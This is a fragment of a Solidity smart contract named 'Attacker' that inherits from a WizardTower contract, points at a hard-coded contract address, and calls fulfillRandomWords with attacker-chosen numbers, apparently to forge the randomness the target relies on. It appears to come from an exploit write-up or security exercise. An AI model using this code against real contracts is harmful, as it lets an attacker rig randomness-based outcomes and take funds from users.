...
contract Attacker is WizardTower {
    uint256[] public numbers;
    address public wordsAddress = address(0x5F10Cc5291BFbBE353C0FefD2eca48eefC43887E);
    WizardTower wizardtower;

    constructor() {
        wizardtower = WizardTower(wordsAddress);
    }
    ...
    function full() public {
        WizardTower.fulfillRandomWords(1, numbers);
    }
